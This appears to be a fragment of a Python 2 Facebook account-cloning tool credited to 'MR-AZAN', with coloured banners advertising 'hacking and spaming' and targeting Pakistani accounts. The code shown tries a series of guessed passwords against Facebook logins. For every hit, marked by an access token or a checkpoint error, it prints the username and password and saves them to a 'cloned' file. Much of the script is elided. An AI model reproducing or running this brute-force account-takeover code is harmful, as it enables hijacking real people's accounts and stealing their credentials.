...
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m Azan                           
\033[0;91m║\033[0;91m FB :\033[0;92m "Azan X.                                          
\033[0;95m╰════════════════════════════════════════════╯
...
\033[1;96mOnly Pakistan Id Clone💜
 
\033[1;99m If you face any problem contact me on Whatsapp +923******💜
 
\033[1;96m------------------THE AZAN💜HACKER----------------------
 
 
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mMR-AZAN                                   
\033[0;91m║\033[0;91mWP No:\033[0;92m "ERROR "                                           
\033[0;95m╰════════════════════════════════════════════╯
 
\033[1;96m-----------------MR AZAN💜HACKER------------------------
"""
logo2 = """
...
def Zeek():
    ...
    time.sleep(0.10)
    print '\x1b[1;94m[2] KHOTIA NO 1 SELECT KAR '
    time.sleep(0.10)
...
def action():
    ...
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan('\033[1;96m▬PROGRAMED BY MR-AZAN')
    jalan("\033[1;96m▬▬MASTER OF HACKING AND SPAMING")
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m(SUCCESSFUL❤️)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(SUCCESSFUL ❤️) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m(SUCCESSFUL ❤️)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(SUCCESSFUL❤️) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m(SUCCESSFUL❤️)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
